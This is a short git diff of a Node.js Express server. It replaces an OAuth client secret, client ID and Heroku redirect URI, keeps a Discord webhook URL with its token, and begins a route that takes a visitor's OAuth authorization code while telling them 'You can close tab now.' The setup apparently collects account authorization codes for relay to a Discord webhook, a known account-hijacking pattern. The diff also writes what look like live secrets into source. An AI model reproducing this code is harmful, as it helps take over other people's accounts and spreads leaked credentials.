@@ -1,7 +1,7 @@
 //Config
-const client_secret = 'db48Q~-c62ZzCCAo3jgkA77TyJnInJTqU6c3kbVq' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '3f3061ce-eeb8-48c2-8223-4f23810bbc6a'
-const redirect_uri = 'https://toogood4u.herokuapp.com'
+const client_secret = 'UH98Q~.S6BsZ8GXREQzTX~mUfAl5BsqKgi7IFbQZ' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '360d2f7a-bd75-405b-9412-d1d9873301b5'
+const redirect_uri = 'https://testoauth.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1045059463083733082/SuRGkEH46EtQOTLIFp_mcVK9M_lNDy_9XG0suVuqz9GwEEkUrktfjzsSkLZB_e4kpldP'
 //Requirements
 const axios = require('axios')
@@ -9,8 +9,6 @@ const express = require('express')
 const app = express()
 const port = process.env.PORT || 3000
 
-
-console.log(slack)
 app.get('/', async (req, res) => {
     res.send('You can close tab now.')
     const code = req.query.code
